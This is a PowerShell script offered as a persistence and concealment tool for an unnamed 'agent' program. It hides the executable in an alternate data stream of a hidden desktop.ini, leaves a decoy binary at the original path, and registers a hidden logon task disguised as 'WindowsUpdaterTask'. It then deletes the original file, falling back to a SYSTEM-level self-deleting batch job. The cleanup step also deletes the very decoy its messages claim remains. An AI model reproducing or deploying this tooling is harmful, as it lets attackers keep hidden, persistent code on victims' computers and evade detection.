param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# ============================================================
# 1. Choose carrier file (Public Desktop\desktop.ini)
# ============================================================
$publicDesktop = "C:\Users\Public\Desktop"
$carrierFile = "$publicDesktop\desktop.ini"
$streamName = "thumbs.db"

if (-not (Test-Path $carrierFile)) {
    @"
[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21769
"@ | Out-File -FilePath $carrierFile -Encoding ASCII
    attrib +h +s $carrierFile
    Write-Output "[+] Created carrier file: $carrierFile"
} else {
    Write-Output "[+] Using existing carrier file: $carrierFile"
}

# ============================================================
# 2. Hide real agent in ADS
# ============================================================
Write-Output "[+] Reading real agent from: $agentPath"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $carrierFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$carrierFile`:$streamName"
Write-Output "[+] Real agent hidden in: $hiddenPath"

# ============================================================
# 3. Create tiny decoy executable at original location
# ============================================================
Write-Output "[+] Creating harmless decoy at original location: $agentPath"
$decoyCode = @'
using System;
class Decoy { static void Main() { Environment.Exit(0); } }
'@
Add-Type -TypeDefinition $decoyCode -OutputAssembly $agentPath -OutputType ConsoleApplication -ErrorAction Stop
Write-Output "[+] Decoy created (does nothing when run)."

# ============================================================
# 4. Create/update scheduled task to run from hidden location
# ============================================================
$taskName = "WindowsUpdaterTask"
$execCommand = "powershell.exe -WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '$hiddenPath'"

schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "$execCommand" /sc onlogon /ru $env:USERNAME /f /it | Out-Null
if ($LASTEXITCODE -eq 0) {
    Write-Output "[+] Scheduled task '$taskName' created. Agent will run at next logon."
} else {
    Write-Output "[-] Failed to create scheduled task."
}

# ============================================================
# 5. Clean up original (keep decoy, delete real)
# ============================================================
Start-Sleep -Seconds 2
try {
    Remove-Item -Path $agentPath -Force -ErrorAction Stop
    Write-Output "[+] Original agent file deleted (decoy remains)."
} catch {
    Write-Output "[-] Original agent still exists – scheduling deletion on next reboot."

    # Create a simple batch file using an array of strings (no here‑string issues)
    $tempScript = "$env:TEMP\del_agent.bat"
    $batchLines = @(
        "@echo off",
        "del /f /q `"$agentPath`"",
        "del /f /q `"%~f0`""
    )
    $batchLines -join "`r`n" | Set-Content -Path $tempScript -Encoding ASCII

    # Create a one‑time scheduled task to run at next boot
    schtasks /create /tn "TempCleanup" /tr "$tempScript" /sc once /st 00:00 /ru SYSTEM /f | Out-Null
}

# ============================================================
# Done
# ============================================================
Write-Output ""
Write-Output "✅ PERSISTENCE AND HIDING COMPLETE"
Write-Output "===================================="
Write-Output "Real agent hidden in: $hiddenPath"
Write-Output "Decoy left at: $agentPath"
Write-Output "Scheduled task will run hidden agent on next logon."